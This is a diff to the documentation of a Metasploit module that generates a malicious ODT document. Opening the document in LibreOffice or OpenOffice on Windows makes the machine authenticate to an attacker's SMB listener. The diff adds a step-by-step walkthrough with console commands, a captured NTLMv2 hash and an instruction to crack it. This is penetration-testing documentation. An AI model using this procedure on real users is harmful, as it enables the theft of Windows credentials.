@@ -4,9 +4,8 @@ without providing any warning to the user. This allows an attacker the opportuni
 
 ## Vulnerable Application
 
-LibreOffice 6.03 /Apache OpenOffice 4.1.5
-https://www.libreoffice.org/download/download/
-https://www.openoffice.org/download/
+ - [LibreOffice 6.03](https://www.libreoffice.org/download/download/)
+ - [Apache OpenOffice 4.1.5](https://sourceforge.net/projects/openofficeorg.mirror/files/4.1.5/binaries/en-US/Apache_OpenOffice_4.1.5_Win_x86_install_en-US.exe/download)
 
 ## Verification Steps
 
@@ -22,34 +21,40 @@ https://www.openoffice.org/download/
 ## Options
 
 **CREATOR**
-This option allows you to customise the document author for the new document.
-This can be changed using set CREATOR New_User
+
+This option allows you to customise the document author for the new document:
+```
+set CREATOR New_User
+```
 
 **FILENAME**
-This option allows you to customise the generated filename.
-This can be changed using set FILENAME salary.odt
+
+This option allows you to customise the generated filename:
+```
+set FILENAME salary.odt
+```
 
 **LHOST**
-This option allows you to set the IP address of the SMB Listener that the .odt document points to
-This can be changed using set LISTENER 192.168.1.25
+
+This option allows you to set the IP address of the SMB Listener that the .odt document points to:
+
+```
+set LISTENER 192.168.1.25
+```
 
 ## Scenarios
 
-LibreOffice 6.03 /Apache OpenOffice 4.1.5 and any version of Microsoft Windows.
+Install LibreOffice 6.03 or Apache OpenOffice 4.1.5 on a Windows workstation.  (Note: This attack does not work against Mac or Linux versions.)
 
   ```
-  Console output
-  ```
-
-  ```
-  msf > use auxiliary/odt/badodt
-  msf auxiliary(odt/badodt) > set FILENAME salary.odt
+  msf5 > use auxiliary/odt/badodt
+  msf5 auxiliary(odt/badodt) > set FILENAME salary.odt
   FILENAME => salary.odt
-  msf auxiliary(odt/badodt) > set LHOST 192.168.1.25
+  msf5 auxiliary(odt/badodt) > set LHOST 192.168.1.25
   LHOST => 192.168.1.25
-  msf auxiliary(odt/badodt) > set CREATOR A_USER
+  msf5 auxiliary(odt/badodt) > set CREATOR A_USER
   CREATOR => A_USER
-  msf auxiliary(odt/badodt) > exploit
+  msf5 auxiliary(odt/badodt) > exploit
 
   [*] Generating Malicious ODT File 
   [*] SMB Listener Address will be set to 192.168.1.25
@@ -57,3 +62,30 @@ LibreOffice 6.03 /Apache OpenOffice 4.1.5 and any version of Microsoft Windows.
   [*] Auxiliary module execution completed
   msf auxiliary(odt/badodt) > 
   ```
+
+On an attacker workstation, use a tool to serve and capture an SMB share on port 445, capturing NTLM hashes.  Note that any tool listening on :445 will require superuser permissions:
+
+  ```
+  $ sudo ./msfconsole
+  msf5 > use auxiliary/server/capture/smb 
+  msf5 auxiliary(server/capture/smb) > run
+  [*] Auxiliary module running as background job 0.
+  msf5 auxiliary(server/capture/smb) >
+  [*] Server started.
+
+  msf5 auxiliary(server/capture/smb) >
+  ```
+
+Leave the metasploit SMB server listening while the user opens the document.  Upon opening the ODT file, the user workstation will attempt to connect (and authenticate) to the attacker workstation:
+
+  ```
+  [*] SMB Captured - 2018-06-06 11:14:23 -0500
+  NTLMv2 Response Captured from 192.168.108.171:49180 - 192.168.108.171
+  USER:asoto-r7 DOMAIN:WIN-TSD7B7BQKDQ OS: LM:
+  LMHASH:Disabled
+  LM_CLIENT_CHALLENGE:Disabled
+  NTHASH:3910d841a30289ad9876e09321c1099a
+  NT_CLIENT_CHALLENGE:0101000000000000a9d923e9f909391957581abc8d91038400000000020000000000000000000000
+  ```
+
+Finally, crack the hash to capture the user's credentials.
